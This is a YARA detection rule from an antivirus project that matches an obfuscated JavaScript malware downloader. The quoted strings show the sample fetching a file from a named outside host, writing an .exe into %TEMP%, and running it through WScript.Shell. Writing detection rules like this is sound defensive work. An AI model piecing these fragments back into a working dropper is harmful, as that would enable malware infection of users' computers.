rule sig_20160330_e88998374c1da4c43d3ddf09c17aa88e {
  meta:
    description = "datamaliciousorder - file 20160330_e88998374c1da4c43d3ddf09c17aa88e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "43c404d13ca54649b8715f5bf7036222aa9dae690d2ef5008b9703363d74ba6e"

  strings:
    $s1  = "_X0[_W0](\"GET\", \"http://dev.orolatina.com/s3isk\", false);" fullword ascii
    $s2  = "var _SW = function _TE() {return WScript[_O](\"WScript\"+\".Shell\");}(), _FK = 11;" fullword ascii
    $s3  = "function _ZY(_YV, _KI){_AO = _AO * 1; return _YV - _KI;};" fullword ascii
    $s4  = "if (_X0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _H() {return _SW[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ZsJQnSXLCdJjoE.ex\" + \"e\";};" fullword ascii
    $s6  = "function _R(){return _E + \"\";};" fullword ascii
    $s7  = "function _WR() {return ((_P == true) && (_P == _QM)) ? 1 : _AO;};" fullword ascii
    $s8  = "function _W(_G){_SW[\"Run\"](_G, _AO, _AO);};" fullword ascii
    $s9  = "function _B(){return 22;};" fullword ascii
    $s10 = "return _ZY(_TA, _EF);" fullword ascii
    $s11 = "function _EA()" fullword ascii
    $s12 = " while (_PO){" fullword ascii
    $s13 = "function _GU(_EW) {var _Q = (1, 2, 3, 4, 5, _EW); return _Q;};" fullword ascii
    $s14 = "function _HO(){return _O;};" fullword ascii
    $s15 = "var _EZ = new this[\"Date\"]();" fullword ascii
    $s16 = "var _P = false;" fullword ascii
    $s17 = "_P = true; " fullword ascii
    $s18 = "var _FM = false;" fullword ascii
    $s19 = "var _QM = false;" fullword ascii
    $s20 = "_QM = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}